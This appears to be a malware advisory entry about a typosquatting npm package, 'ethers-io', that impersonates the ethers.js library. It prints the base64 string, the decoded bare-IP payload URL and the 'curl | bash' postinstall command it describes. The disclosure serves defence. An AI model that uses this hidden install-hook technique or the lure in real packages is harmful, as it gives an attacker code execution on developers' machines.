summary: ethers-io postinstall fetches base64-hidden remote payload and pipes to bash
details: package.json declares a postinstall hook that base64-decodes the string 'aHR0cDovLzguMjE3Ljc1LjE0NzozMDAwL3BheWxvYWQ=' to 'http://8.217.75.147:3000/payload' and executes 'curl -s <url> | bash' via child_process.execSync. The fetch uses plain HTTP to a bare IP with no integrity verification, and the response is piped directly to a shell — granting the operator of 8.217.75.147 arbitrary code execution on every installer's machine at 'npm install' time. The package name 'ethers-io' and its description ('I/O utilities for ethers.js — RPC connection helpers, transaction parsing, and event log decoding') impersonate the widely-used 'ethers' Ethereum library, broadening the lure for developers searching for ethers utilities.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
